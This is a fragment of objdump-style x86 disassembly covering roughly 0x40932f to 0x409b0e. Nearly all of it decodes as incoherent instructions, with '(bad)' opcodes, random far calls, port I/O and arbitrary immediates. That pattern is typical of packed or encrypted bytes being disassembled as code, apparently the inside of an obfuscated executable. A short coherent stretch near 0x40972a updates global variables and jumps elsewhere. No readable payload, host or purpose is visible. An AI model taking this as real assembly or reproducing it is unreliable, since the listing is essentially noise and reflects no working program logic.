  40932f:	or     BYTE PTR ds:0x1ddc856a,0x20
  409336:	lock iret 
  409338:	fsubr  DWORD PTR [edi+0x34]
  40933b:	sbb    dh,BYTE PTR [edi-0x3436d0f4]
  409341:	adc    al,0xc
  409343:	or     cl,bl
  409345:	pop    esi
  409346:	out    0x37,eax
  409348:	dec    ebx
  409349:	(bad)  
  40934a:	call   0xd40d74a6
  40934f:	xor    al,ch
  409351:	repnz push es
  409353:	mov    bh,0xc1
  409355:	sub    DWORD PTR [edi+0x6ab72f7b],ebx
  40935b:	mov    esp,0x4663138c
  409360:	jle    0x409324
  409362:	add    esi,esi
  409364:	jne    0x409381
  409366:	add    BYTE PTR [ecx-0x54c015f7],ah
  40936c:	add    cl,ch
  40936e:	call   0x419c:0x4506cda4
  409375:	xchg   DWORD PTR [eax],ebx
  409377:	xor    eax,DWORD PTR [eax-0x3d]
  40937a:	lahf   
  40937b:	jbe    0x409332
  40937d:	or     bh,BYTE PTR [edx-0x2c]
  409380:	mov    ebp,?
  409382:	push   ss
  409383:	cmc    
  409384:	sbb    al,BYTE PTR [edi+0x690fdebf]
  40938a:	push   ebx
  40938b:	inc    ebx
  40938c:	fiadd  DWORD PTR [ecx]
  40938e:	cmc    
  40938f:	lods   al,BYTE PTR ds:[esi]
  409390:	arpl   ax,si
  409392:	adc    eax,0x5e9a0e2
  409397:	nop
  409398:	pusha  
  409399:	bnd ja 0x4093e5
  40939c:	cmp    DWORD PTR [edi-0x6f],eax
  40939f:	aas    
  4093a0:	jo     0x409349
  4093a2:	xchg   esp,eax
  4093a3:	mov    esp,0x428e35dc
  4093a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093a9:	leave  
  4093aa:	ror    BYTE PTR [edx],cl
  4093ac:	adc    BYTE PTR [ecx+0xa],0xb
  4093b0:	sub    bh,BYTE PTR [ebp+0xa]
  4093b3:	in     eax,0x90
  4093b5:	dec    ebp
  4093b6:	test   DWORD PTR [ecx],ebp
  4093b8:	hlt    
  4093b9:	(bad)
  4093bd:	mov    al,0x25
  4093bf:	cmp    bh,dl
  4093c1:	xor    ebx,0x30
  4093c4:	xlat   BYTE PTR ds:[ebx]
  4093c5:	shr    BYTE PTR [edi-0x60],0x8d
  4093c9:	ret    
  4093ca:	xor    al,0x82
  4093cc:	xchg   esp,edi
  4093ce:	stos   BYTE PTR es:[edi],al
  4093cf:	stos   BYTE PTR es:[edi],al
  4093d0:	in     al,dx
  4093d1:	jp     0x4093b3
  4093d3:	fisub  WORD PTR [edx+edi*2-0x31]
  4093d7:	or     eax,0xb8ce16b9
  4093dc:	(bad)  
  4093dd:	fistp  WORD PTR [eax-0x40]
  4093e0:	or     al,0x32
  4093e2:	popf   
  4093e3:	jb     0x4093b0
  4093e5:	mov    cs,WORD PTR [ecx]
  4093e7:	outs   dx,BYTE PTR ds:[esi]
  4093e8:	in     eax,dx
  4093e9:	mov    dh,0x63
  4093eb:	mov    ds:0xb4e4b918,eax
  4093f0:	sahf   
  4093f1:	and    bl,BYTE PTR [ebx]
  4093f3:	mov    edx,0xb1d1aa40
  4093f8:	push   es
  4093f9:	and    al,BYTE PTR [ecx-0x78]
  4093fc:	(bad)  
  4093fd:	stc    
  4093fe:	sbb    ecx,DWORD PTR ds:0x8f6f5e7a
  409404:	sub    al,0x97
  409406:	jmp    0x4093cd
  409408:	dec    ebp
  409409:	idiv   bh
  40940b:	xor    eax,0x68bcd5e4
  409410:	jmp    0x4a37:0xffd591c
  409417:	nop
  409418:	ja     0x4093e5
  40941a:	jnp    0x409407
  40941c:	fsubp  st(4),st
  40941e:	out    dx,eax
  40941f:	out    dx,eax
  409420:	pop    esp
  409421:	mov    BYTE PTR [edx+0x8],0x40
  409425:	loopne 0x40947b
  409427:	std    
  409428:	xchg   ecx,eax
  409429:	xchg   esi,edi
  40942b:	cmp    bl,cl
  40942d:	or     ah,BYTE PTR [ecx]
  40942f:	xor    ecx,DWORD PTR [edi+0x338227df]
  409435:	pop    esi
  409436:	aas    
  409437:	push   0x4412540e
  40943c:	pushf  
  40943d:	popa   
  40943e:	sbb    al,0x3e
  409440:	(bad)  
  409441:	mov    al,ds:0x9e96377b
  409447:	jp     0x409441
  409449:	nop
  40944a:	cmp    ah,0x40
  40944d:	cmp    ch,BYTE PTR [eax]
  40944f:	add    al,0x1a
  409451:	sahf   
  409452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409453:	hlt    
  409454:	mov    ds:0x9df4f3e4,al
  409459:	sbb    BYTE PTR [ebp+0x5c],cl
  40945c:	push   ss
  40945d:	adc    BYTE PTR [esi],ah
  40945f:	jge    0x409470
  409461:	dec    esp
  409462:	push   edx
  409463:	jle    0x409440
  409465:	dec    ecx
  409466:	cmp    dh,0xc0
  409469:	(bad)  
  40946b:	pop    edi
  40946c:	inc    ebp
  40946d:	cmc    
  40946e:	mov    ecx,0xbe3aeb80
  409473:	call   0x9b5d:0x7aced00d
  40947a:	mov    dl,0x91
  40947c:	mov    ds:0x73695f3f,eax
  409481:	cld    
  409482:	popa   
  409483:	cmc    
  409484:	out    dx,eax
  409485:	repnz cmp eax,0x655fd0d8
  40948b:	xor    DWORD PTR [eax+0x3cb3f145],esp
  409491:	test   eax,0x58b53f4b
  409496:	push   0xffffffa8
  409498:	(bad)  
  409499:	dec    ebp
  40949a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40949b:	xchg   dl,bl
  40949d:	mov    edi,0x20af11ef
  4094a2:	(bad)  
  4094a3:	outs   dx,BYTE PTR ds:[esi]
  4094a4:	jne    0x4094d8
  4094a6:	push   es
  4094a7:	arpl   ax,bx
  4094a9:	push   esp
  4094aa:	dec    ecx
  4094ab:	ds cwde 
  4094ad:	push   eax
  4094ae:	mov    ch,0x35
  4094b0:	(bad)
  4094b3:	push   eax
  4094b4:	loope  0x4094f6
  4094b6:	ins    BYTE PTR es:[edi],dx
  4094b7:	xchg   edi,eax
  4094b8:	adc    al,0x89
  4094ba:	iret   
  4094bb:	mov    ch,bl
  4094bd:	pop    edx
  4094be:	(bad)  
  4094bf:	clc    
  4094c0:	jmp    0x7092:0xdb260b95
  4094c7:	xlat   BYTE PTR ds:[ebx]
  4094c8:	add    al,0xe4
  4094ca:	mov    ds:0x3d73d153,al
  4094cf:	push   cs
  4094d0:	(bad)  
  4094d1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4094d3:	mov    al,ds:0x1b00a58f
  4094d8:	mov    edx,0x5e00a687
  4094dd:	dec    ebx
  4094de:	cmc    
  4094df:	(bad)  [esi]
  4094e1:	leave  
  4094e2:	sbb    DWORD PTR [ebx-0xe],ecx
  4094e5:	xor    ah,BYTE PTR ds:0x724d84b0
  4094eb:	into   
  4094ec:	out    dx,al
  4094ed:	jnp    0x40956b
  4094ef:	cld    
  4094f0:	fistp  QWORD PTR [esi-0x562b9b5d]
  4094f6:	dec    esi
  4094f7:	pop    edi
  4094f8:	add    DWORD PTR [edx-0x69],0x62cab4c7
  4094ff:	int3   
  409500:	add    al,0xcc
  409502:	inc    ebx
  409503:	sub    ah,BYTE PTR [eax+0x45]
  409506:	and    DWORD PTR [ecx-0x7c917dca],ecx
  40950c:	test   DWORD PTR [ebx-0x5b],edi
  40950f:	cmp    cl,BYTE PTR [ecx+0x25e17896]
  409515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409516:	pop    edi
  409517:	xchg   esi,eax
  409518:	jmp    0x409592
  40951a:	loopne 0x409579
  40951c:	dec    edi
  40951d:	not    BYTE PTR [eax-0x257eb2ee]
  409523:	mov    bl,0xa2
  409525:	repz mov eax,ds:0x67bb7cb0
  40952b:	pop    esi
  40952c:	sbb    eax,0x1c5bf11
  409531:	mov    es,ecx
  409533:	outs   dx,BYTE PTR ds:[esi]
  409534:	loope  0x409512
  409536:	mov    ecx,0x86e2c7ae
  40953b:	mov    cl,0x97
  40953d:	xchg   esp,eax
  40953e:	(bad)  
  40953f:	in     eax,0xec
  409541:	jl     0x409501
  409543:	sub    DWORD PTR [esi+esi*2+0x44],edx
  409547:	out    dx,eax
  409548:	test   eax,0xe7d357bf
  40954d:	push   eax
  40954e:	adc    al,0xcb
  409550:	and    BYTE PTR [ebx],cl
  409552:	out    0x5b,al
  409554:	ficom  WORD PTR ds:0xe74ddd12
  40955a:	sar    DWORD PTR [edx-0x40],1
  40955d:	enter  0x1720,0x5a
  409561:	xor    al,0xc5
  409563:	push   edx
  409564:	jle    0x40953b
  409566:	xchg   ebx,eax
  409567:	xor    BYTE PTR [ebx+0x1],ch
  40956a:	sub    al,0xb4
  40956c:	pop    eax
  40956d:	dec    ebx
  40956e:	xchg   BYTE PTR [edi+0x2a],ch
  409571:	jmp    0x527033a1
  409576:	xor    DWORD PTR [ebp+0x62796de2],0xfffffff4
  40957d:	xor    ah,0xd8
  409580:	retf   
  409581:	mov    WORD PTR [edi+0x4ad5a74e],gs
  409587:	add    eax,ecx
  409589:	fistp  QWORD PTR [esp+ebp*2+0x37]
  40958d:	jle    0x4095f0
  40958f:	fistp  WORD PTR gs:[esi-0xc]
  409593:	xor    BYTE PTR [edx-0x3a8d844b],al
  409599:	or     eax,0x78cb59ae
  40959e:	mov    esi,0x20132bb9
  4095a3:	ficomp WORD PTR [ecx]
  4095a5:	pop    ds
  4095a6:	pop    ss
  4095a7:	mov    cs,WORD PTR [edi+eax*8]
  4095aa:	and    BYTE PTR [edx],bh
  4095ac:	sub    bh,BYTE PTR [edx+0x6cd99b84]
  4095b2:	cmc    
  4095b3:	xchg   dh,bl
  4095b5:	xchg   ebx,eax
  4095b6:	sar    DWORD PTR [edx+0x10e8ffda],cl
  4095bc:	es sahf 
  4095be:	inc    edi
  4095bf:	(bad)  
  4095c0:	xor    DWORD PTR [edi+edi*2],esi
  4095c3:	sbb    eax,0x7fb1fbc8
  4095c8:	jl     0x409619
  4095ca:	dec    ebp
  4095cb:	out    dx,eax
  4095cc:	outs   dx,DWORD PTR ds:[esi]
  4095cd:	popf   
  4095ce:	push   edx
  4095cf:	cwde   
  4095d0:	test   DWORD PTR [edi+0x225059d1],0xcdcebcc1
  4095da:	cwde   
  4095db:	shl    DWORD PTR [edx+0x1d],cl
  4095de:	lods   eax,DWORD PTR ds:[esi]
  4095df:	sub    eax,DWORD PTR [ebx]
  4095e1:	lock call 0xee76:0xe9fbd2bf
  4095e9:	cld    
  4095ea:	xchg   DWORD PTR [edx+0x62],ebp
  4095ed:	xor    eax,0x9162a6df
  4095f2:	test   DWORD PTR [eax],0xafd1396d
  4095f8:	aam    0x55
  4095fa:	push   esi
  4095fb:	push   ebp
  4095fc:	push   edx
  4095fd:	mov    al,BYTE PTR [edi]
  4095ff:	test   BYTE PTR [ebx],al
  409601:	sbb    al,0x7a
  409603:	pop    ebx
  409604:	jle    0x4095f6
  409606:	fwait
  409607:	sar    DWORD PTR [edi-0x5a],cl
  40960a:	sti    
  40960b:	pusha  
  40960c:	jno    0x40961a
  40960e:	sbb    ah,BYTE PTR [esi+ecx*4-0x528e96ce]
  409615:	sahf   
  409616:	push   edi
  409617:	and    al,0x1a
  409619:	pop    es
  40961a:	adc    BYTE PTR [edi+0x14c2ff6b],0x86
  409621:	push   esp
  409622:	xor    esp,eax
  409624:	mov    eax,ds:0x268df1a6
  409629:	mov    esi,0xcac0521d
  40962e:	adc    ebx,DWORD PTR [eax+0x3c]
  409631:	sbb    bh,BYTE PTR [ebx+0x3b9eb698]
  409637:	mov    al,0xe2
  409639:	or     BYTE PTR [edi+0x24],ah
  40963c:	xor    DWORD PTR [ecx-0x41],edi
  40963f:	push   esp
  409640:	ja     0x4096c0
  409642:	clc    
  409643:	jge    0x409662
  409645:	(bad)  
  409646:	dec    ecx
  409647:	sbb    DWORD PTR [ebp-0x56de7606],edi
  40964d:	int3   
  40964e:	sbb    eax,0xba5e610b
  409653:	xor    esp,ecx
  409655:	xchg   DWORD PTR [ecx+edi*8],ebp
  409658:	and    bh,BYTE PTR [esi-0x69ab7023]
  40965e:	cld    
  40965f:	out    dx,eax
  409660:	out    dx,eax
  409661:	mov    ch,0x3e
  409663:	outs   dx,BYTE PTR ds:[esi]
  409664:	scas   al,BYTE PTR es:[edi]
  409665:	mov    ah,0x1a
  409667:	cmp    BYTE PTR [ebp-0x21],dl
  40966a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40966b:	scas   eax,DWORD PTR es:[edi]
  40966c:	and    ebx,ebx
  40966e:	fcomp  DWORD PTR [ebx+0x3f34b125]
  409674:	stos   DWORD PTR es:[edi],eax
  409675:	aam    0x73
  409677:	(bad)  
  409678:	call   0x72a0:0xb1eb3142
  40967f:	mov    cl,0xa5
  409681:	mov    bh,0x85
  409683:	jbe    0x409673
  409685:	inc    ebx
  409686:	out    dx,ax
  409688:	pop    esi
  409689:	vcvttps2uqq xmm0{k5},QWORD PTR [esi]
  40968f:	cmp    BYTE PTR [esi-0x11135534],cl
  409695:	jb     0x40968b
  409697:	mov    ch,0xb7
  409699:	pop    eax
  40969a:	test   al,0x36
  40969c:	inc    ebx
  40969d:	fistp  QWORD PTR [ecx+0x24d0397e]
  4096a3:	in     al,0x51
  4096a5:	jno    0x4096b3
  4096a7:	or     eax,0x8f939c8a
  4096ac:	test   BYTE PTR [ecx],dl
  4096ae:	sbb    BYTE PTR [ebp+0x4b50ff66],dl
  4096b4:	addr16 pop ds
  4096b6:	lods   eax,DWORD PTR ds:[esi]
  4096b7:	ret    0xda7f
  4096ba:	jne    0x409673
  4096bc:	or     al,0xad
  4096be:	xor    esi,DWORD PTR [edi+0x7b]
  4096c1:	mov    dl,0xd0
  4096c3:	std    
  4096c4:	add    al,0x6d
  4096c6:	daa    
  4096c7:	jnp    0x40969e
  4096c9:	or     eax,0xc5e94bb7
  4096ce:	hlt    
  4096cf:	push   eax
  4096d0:	dec    edi
  4096d1:	daa    
  4096d2:	mov    ax,0x6f
  4096d6:	add    al,0x60
  4096d8:	or     edi,DWORD PTR [esi-0x1f]
  4096db:	jp     0x409666
  4096dd:	push   cs
  4096de:	rcr    DWORD PTR [ebp+0xf],1
  4096e1:	call   0x3e32:0xc376858c
  4096e8:	pop    ds
  4096e9:	xor    eax,0xfcacd5f0
  4096ee:	mov    esi,0x68def429
  4096f3:	retf   0xc108
  4096f6:	int3   
  4096f7:	mov    esp,DWORD PTR [ecx+0x32c6e988]
  4096fd:	(bad)  
  4096ff:	(bad)  
  409700:	jbe    0x409754
  409702:	dec    ebp
  409703:	inc    ebp
  409704:	es mov bl,0x9e
  409707:	fld    QWORD PTR [edi-0x71cf75b8]
  40970d:	sub    ebx,DWORD PTR [edx+0x0]
  409710:	inc    esi
  409711:	xchg   esi,eax
  409712:	mov    ah,0x56
  409714:	popf   
  409715:	push   esi
  409716:	bound  ebx,QWORD PTR [ebp-0x7432a5b2]
  40971c:	inc    ebp
  40971d:	or     BYTE PTR [ebx+0x43470f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434713
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4345f3
  409745:	add    ecx,DWORD PTR ds:0x434637
  40974b:	mov    DWORD PTR ds:0x4345f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	push   0xfffffff3
  409767:	adc    BYTE PTR [edi],bh
  409769:	xchg   esp,eax
  40976a:	out    dx,al
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	inc    ebp
  409772:	pop    es
  409773:	cwde   
  409774:	hlt    
  409775:	and    eax,0x531dd45b
  40977a:	or     DWORD PTR [ebx],ecx
  40977c:	mov    dh,0x38
  40977e:	out    dx,eax
  40977f:	test   BYTE PTR [ecx+0x273ce5fc],dl
  409785:	pusha  
  409786:	inc    ebp
  409787:	cmp    al,0x66
  409789:	outs   dx,DWORD PTR ds:[esi]
  40978a:	rcr    DWORD PTR [eax-0xa677fa4],cl
  409790:	cdq    
  409791:	jno    0x409770
  409793:	jnp    0x409802
  409795:	jge    0x409773
  409797:	or     eax,0xaa22311a
  40979c:	stos   DWORD PTR es:[edi],eax
  40979d:	xchg   esp,eax
  40979e:	jae    0x4097f8
  4097a0:	retf   
  4097a1:	loopne 0x409729
  4097a3:	and    BYTE PTR [ebx],dh
  4097a5:	pop    esi
  4097a6:	iret   
  4097a7:	adc    al,0xd4
  4097a9:	pop    ss
  4097aa:	ins    BYTE PTR es:[edi],dx
  4097ab:	or     eax,0x86acc163
  4097b0:	lds    esi,FWORD PTR [edi-0x7162e0e7]
  4097b6:	pop    eax
  4097b7:	iret   
  4097b8:	test   DWORD PTR [esi],edi
  4097ba:	adc    bl,BYTE PTR [esi+0x2c0aeb29]
  4097c0:	into   
  4097c1:	adc    al,0xa0
  4097c3:	(bad)  
  4097c4:	push   ss
  4097c5:	pop    ss
  4097c6:	xor    DWORD PTR [ecx+0x1d],esp
  4097c9:	mov    bh,0x87
  4097cb:	sub    ah,ch
  4097cd:	xchg   edi,eax
  4097ce:	cmp    BYTE PTR [eax],ah
  4097d0:	or     eax,0x6e6078ef
  4097d5:	mov    ebp,0xebd0e5cc
  4097da:	sub    BYTE PTR es:[eax-0x2b],0x98
  4097df:	xchg   eax,ecx
  4097e1:	rol    DWORD PTR [ebx],cl
  4097e3:	xor    BYTE PTR [edx+0x18],cl
  4097e6:	add    ah,dh
  4097e8:	test   al,0x33
  4097ea:	iret   
  4097eb:	mov    fs,WORD PTR es:[edi+edi*1]
  4097ef:	rcr    BYTE PTR [ebp+0xfe93ddf],1
  4097f5:	sahf   
  4097f6:	in     al,dx
  4097f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f8:	popa   
  4097f9:	mov    ds,edx
  4097fb:	pop    esp
  4097fc:	jp     0x4097b1
  4097fe:	outs   dx,DWORD PTR ds:[esi]
  4097ff:	mov    ch,0x48
  409801:	pop    esi
  409802:	xchg   esp,eax
  409803:	xchg   esi,eax
  409804:	dec    ecx
  409805:	xor    eax,0x5a4d5ba3
  40980a:	cld    
  40980b:	mov    eax,0x5d9c7e44
  409810:	fldcw  WORD PTR [eax]
  409812:	adc    DWORD PTR [ecx],ebp
  409814:	mov    ecx,0x7587565c
  409819:	sbb    edx,ebx
  40981b:	ret    0xc90a
  40981e:	inc    edx
  40981f:	inc    edx
  409820:	rol    BYTE PTR [edx-0x31],cl
  409823:	jmp    0x9f184f66
  409828:	cmp    eax,0x80f85901
  40982d:	xor    al,0xba
  40982f:	and    BYTE PTR [ebx-0x7973f60c],dl
  409835:	jg     0x409840
  409837:	ret    
  409838:	xchg   esp,eax
  409839:	xchg   edx,eax
  40983a:	pop    ebx
  40983b:	jno    0x409865
  40983d:	sub    BYTE PTR [ebx+0x10],0x95
  409841:	ret    
  409842:	fcmovu st,st(4)
  409844:	jo     0x4098ae
  409846:	retf   0x7c05
  409849:	sbb    BYTE PTR [edx+ebx*1],ah
  40984c:	dec    ebp
  40984d:	xchg   BYTE PTR [ecx],bh
  40984f:	gs mov ebx,0xc2118f55
  409855:	xor    cl,BYTE PTR ds:0x27aa0650
  40985b:	xor    ebx,DWORD PTR [ebp-0x3faf4e09]
  409861:	mov    ds:0x5aa7151c,al
  409866:	inc    ebx
  409867:	stos   DWORD PTR es:[edi],eax
  409868:	mov    ecx,0xce7d71b3
  40986d:	loopne 0x4098b3
  40986f:	xor    BYTE PTR [esi+0x4b],dh
  409872:	test   DWORD PTR [ecx-0x7f],ecx
  409875:	xchg   DWORD PTR [esi],esi
  409877:	mov    bh,0x75
  409879:	lods   eax,DWORD PTR ds:[esi]
  40987a:	pop    edi
  40987b:	dec    esi
  40987c:	(bad)  
  40987d:	das    
  40987e:	sub    bh,BYTE PTR ds:0x2c98508e
  409884:	inc    DWORD PTR [ecx+ebx*4-0xd98f2f1]
  40988b:	jbe    0x409897
  40988d:	xchg   ebp,eax
  40988e:	pusha  
  40988f:	lods   al,BYTE PTR ds:[esi]
  409890:	in     al,dx
  409891:	call   0xd9904cd1
  409896:	xlat   BYTE PTR ds:[ebx]
  409897:	popf   
  409898:	mov    bl,0x62
  40989a:	leave  
  40989b:	inc    ecx
  40989c:	mov    ebp,0xc15a1fdc
  4098a1:	pop    es
  4098a2:	test   BYTE PTR [eax],ah
  4098a4:	mov    bh,0x94
  4098a6:	or     edx,esp
  4098a8:	adc    DWORD PTR [eax+esi*4],esp
  4098ab:	outs   dx,DWORD PTR ds:[esi]
  4098ac:	dec    esp
  4098ad:	add    al,0x7
  4098b0:	ret    
  4098b1:	jp     0x4098d1
  4098b3:	jl     0x409884
  4098b5:	test   al,0xd5
  4098b7:	hlt    
  4098b8:	ss ins DWORD PTR es:[edi],dx
  4098ba:	cld    
  4098bb:	lods   eax,DWORD PTR ds:[esi]
  4098bc:	mov    ds:0x96e4e2fd,al
  4098c1:	pop    es
  4098c2:	xchg   ebp,eax
  4098c3:	sar    ch,cl
  4098c5:	cs pop edx
  4098c7:	ds xor edx,ebx
  4098ca:	sbb    BYTE PTR [esi],0xc2
  4098cd:	aas    
  4098ce:	mov    ch,0xb9
  4098d0:	retf   0x5017
  4098d3:	inc    edx
  4098d4:	add    DWORD PTR [ebx-0x38],edx
  4098d7:	js     0x4098ca
  4098d9:	andps  xmm5,XMMWORD PTR [eax]
  4098dc:	cmp    DWORD PTR [ebx],edx
  4098de:	or     edx,0x6e
  4098e1:	jnp    0x4098b1
  4098e3:	push   esi
  4098e4:	sbb    ah,ah
  4098e6:	jns    0x4098e2
  4098e8:	mov    bl,0x32
  4098ea:	ret    0x32d4
  4098ed:	ss test al,0xd5
  4098f0:	scas   eax,DWORD PTR es:[edi]
  4098f1:	jae    0x4098f1
  4098f3:	cmp    DWORD PTR [esi],edi
  4098f5:	aaa    
  4098f6:	sti    
  4098f7:	mov    al,ds:0x419c345d
  4098fc:	sbb    edi,DWORD PTR [ebp-0x10]
  4098ff:	sahf   
  409900:	and    dl,cl
  409902:	and    ebx,DWORD PTR [ecx+edi*4+0x7e]
  409906:	jo     0x409890
  409908:	adc    BYTE PTR [ecx-0x32f1c7c9],al
  40990e:	pop    edi
  40990f:	es popf 
  409911:	mov    al,0x76
  409913:	outs   dx,BYTE PTR ds:[esi]
  409914:	ficom  WORD PTR [ebp-0x1a8e3395]
  40991a:	jp     0x40998f
  40991c:	scas   al,BYTE PTR es:[edi]
  40991d:	mov    esi,0xb74c5586
  409922:	mov    bh,0xa3
  409924:	ror    BYTE PTR [esi+0x419ae1e],0x29
  40992b:	sub    bh,0x45
  40992e:	and    DWORD PTR [eax+0x3ab135ef],esi
  409934:	out    dx,eax
  409935:	ins    BYTE PTR es:[edi],dx
  409936:	imul   edi,DWORD PTR [edx],0x8bf0546f
  40993c:	std    
  40993d:	mov    ds:0xed3103c8,al
  409942:	out    0xb7,eax
  409944:	idiv   BYTE PTR [ebp+0x5c]
  409947:	sub    BYTE PTR [edx],bl
  409949:	mov    bh,0x35
  40994b:	xor    al,0x8
  40994d:	mul    DWORD PTR [ebp+edx*1+0x3d70a1f0]
  409954:	push   ss
  409955:	and    al,0x45
  409957:	mov    esp,0x4aae0b3
  40995c:	adc    bh,0x66
  40995f:	cdq    
  409960:	pop    esp
  409961:	test   DWORD PTR [edx+edx*4],edi
  409964:	or     eax,DWORD PTR ds:0x38453242
  40996a:	daa    
  40996b:	bswap  ecx
  40996d:	sbb    DWORD PTR [esi],0xc78600d7
  409973:	aas    
  409974:	xchg   DWORD PTR [esi-0x3cd412b1],esp
  40997a:	sub    edx,DWORD PTR [ebx+eax*4-0x36173ce8]
  409981:	mov    ah,0xc3
  409983:	dec    edx
  409984:	call   0x1244f499
  409989:	nop
  40998a:	retf   
  40998b:	adc    bl,BYTE PTR [edx-0x4e9a7e9f]
  409991:	push   edx
  409992:	push   esp
  409993:	dec    eax
  409994:	pusha  
  409995:	fs sub eax,0xcf8e09f1
  40999b:	jmp    0xee47:0x5dfc4af3
  4099a2:	lahf   
  4099a3:	(bad)  
  4099a5:	inc    edi
  4099a6:	dec    ebp
  4099a7:	fidiv  WORD PTR [edi+eax*4]
  4099aa:	imul   edx,edx,0xffffff91
  4099ad:	cmp    al,0x76
  4099af:	dec    eax
  4099b0:	fwait
  4099b1:	mov    ah,BYTE PTR [edi+0x338639d0]
  4099b7:	adc    bl,BYTE PTR [ebp+0x21e86e12]
  4099bd:	or     al,BYTE PTR [ebx-0x14813009]
  4099c3:	shr    BYTE PTR [ebx],0xf3
  4099c6:	dec    esi
  4099c7:	inc    esi
  4099c8:	or     BYTE PTR cs:[ebx-0x6624b8a7],0xa3
  4099d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d1:	jb     0x409969
  4099d3:	xor    al,0xf6
  4099d5:	fstp   QWORD PTR [esi+0xa]
  4099d8:	cli    
  4099d9:	(bad)  
  4099da:	sbb    edi,edi
  4099dc:	repz lahf 
  4099de:	push   0x1f
  4099e0:	adc    ah,BYTE PTR [edi+0x74]
  4099e3:	and    eax,0x895d2239
  4099e8:	or     edx,DWORD PTR [ecx+ebx*2+0x46]
  4099ec:	aaa    
  4099ed:	push   esp
  4099ee:	call   0x1a84748f
  4099f3:	pop    ebp
  4099f4:	xlat   BYTE PTR ds:[ebx]
  4099f5:	enter  0x9965,0xee
  4099f9:	xor    eax,0x69d34bbe
  4099fe:	mov    esp,0x430ccacf
  409a03:	lods   al,BYTE PTR ds:[esi]
  409a04:	out    0x73,eax
  409a06:	push   edx
  409a07:	and    DWORD PTR [ebp+0x219bc25d],edi
  409a0d:	sbb    ebp,ebx
  409a0f:	and    eax,0x5e85788f
  409a14:	fiadd  WORD PTR [ebp+0x549cfdbc]
  409a1b:	in     al,0xc5
  409a1d:	pop    es
  409a1e:	fiadd  DWORD PTR [ecx-0x4733ce4f]
  409a24:	pop    esp
  409a25:	stos   DWORD PTR es:[edi],eax
  409a26:	pop    edx
  409a27:	and    eax,DWORD PTR [esi]
  409a29:	xchg   esp,eax
  409a2a:	test   dl,ah
  409a2c:	mov    BYTE PTR [ebp+0x385538f3],dh
  409a32:	bound  esp,QWORD PTR [edi]
  409a34:	test   eax,0x240b23dd
  409a39:	popa   
  409a3a:	outs   dx,DWORD PTR ds:[esi]
  409a3b:	sub    ebx,DWORD PTR [si-0x43b4]
  409a40:	mov    ecx,0x9008adea
  409a45:	std    
  409a46:	cmp    dl,BYTE PTR [edx-0x2c]
  409a49:	pop    ds
  409a4a:	shr    BYTE PTR [esi-0x4830a05a],cl
  409a50:	call   0x8b44d506
  409a55:	inc    edx
  409a56:	stos   BYTE PTR es:[edi],al
  409a57:	imul   edi,esi,0xffffffce
  409a5a:	out    dx,eax
  409a5b:	push   DWORD PTR [ebp-0x16]
  409a5e:	fbstp  TBYTE PTR [ebx+ecx*4-0x49c8e198]
  409a65:	call   0x7bc9:0x7a910f3b
  409a6c:	push   ebp
  409a6d:	mov    ds:0x7cb1e9e2,eax
  409a72:	lds    edi,FWORD PTR [edi-0x43de6af4]
  409a78:	aaa    
  409a79:	add    esp,DWORD PTR [esi-0xc]
  409a7c:	fdiv   DWORD PTR [ebx-0x7d75a45a]
  409a82:	(bad)  
  409a83:	sbb    eax,0x816af4a8
  409a88:	jae    0x409a51
  409a8a:	pop    edi
  409a8b:	call   0xa054:0x5b8332e
  409a92:	lea    sp,[ecx-0x634d3f97]
  409a99:	mov    esp,0xc12c5c9b
  409a9e:	cmc    
  409a9f:	test   BYTE PTR [edi+0x64fa1a2e],bh
  409aa5:	inc    esi
  409aa6:	jbe    0x409a57
  409aa8:	push   esp
  409aa9:	pop    esp
  409aaa:	push   esi
  409aab:	xor    al,bl
  409aad:	fs clc 
  409aaf:	pop    esp
  409ab0:	or     BYTE PTR [edx+0x29],bl
  409ab3:	dec    esi
  409ab4:	xchg   ecx,eax
  409ab5:	mov    ch,0xa7
  409ab7:	inc    ebp
  409ab8:	(bad)  
  409ab9:	mov    eax,0x1c6674a1
  409abe:	popa   
  409abf:	or     BYTE PTR [edx],bh
  409ac1:	popf   
  409ac2:	(bad)  
  409ac3:	mul    ecx
  409ac5:	mov    ah,0x93
  409ac7:	xor    cl,cl
  409ac9:	push   ecx
  409aca:	out    dx,eax
  409acb:	adc    BYTE PTR [eax],bl
  409acd:	pop    ss
  409ace:	sub    edx,ebx
  409ad0:	cld    
  409ad1:	mov    DWORD PTR [ebx+ecx*8],esp
  409ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad5:	fisttp WORD PTR [ecx+0x5a]
  409ad8:	outs   dx,DWORD PTR ds:[esi]
  409ad9:	imul   eax,DWORD PTR [ebx],0xad7d77e4
  409adf:	les    ebp,FWORD PTR [edi]
  409ae1:	adc    al,0x3d
  409ae3:	pop    ss
  409ae4:	mov    gs,WORD PTR [eax+0x45]
  409ae7:	add    al,BYTE PTR [ebx+edi*2-0x14]
  409aeb:	add    eax,0xddfa8e99
  409af0:	push   eax
  409af1:	and    esi,edx
  409af3:	push   eax
  409af4:	mov    al,0xf6
  409af6:	lds    ebx,FWORD PTR [edi+eax*2-0x2c]
  409afa:	lods   eax,DWORD PTR ds:[esi]
  409afb:	loop   0x409ab5
  409afd:	mov    eax,ds:0x996c75e5
  409b02:	jmp    0x8c34:0xe33e2425
  409b09:	cld    
  409b0a:	mov    BYTE PTR [edi-0x8],bl
  409b0d:	inc    ecx
  409b0e:	xchg   ecx,eax
